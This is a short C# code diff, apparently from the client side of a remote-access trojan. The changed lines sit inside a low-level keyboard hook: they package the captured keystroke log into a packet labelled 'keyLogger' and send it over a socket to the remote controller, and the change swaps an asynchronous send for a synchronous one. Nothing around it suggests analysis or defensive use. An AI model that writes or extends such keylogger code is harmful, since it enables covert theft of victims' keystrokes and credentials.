@@ -128,7 +128,7 @@ namespace Client.Handle_Packet
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                     msgpack.ForcePathObject("log").AsString = sb.ToString();
-                    Sockets.ClientSocket.BeginSend(msgpack.Encode2Bytes());
+                    Sockets.ClientSocket.Send(msgpack.Encode2Bytes());
                 }
                 return CallNextHookEx(_hookID, nCode, wParam, lParam);
             }
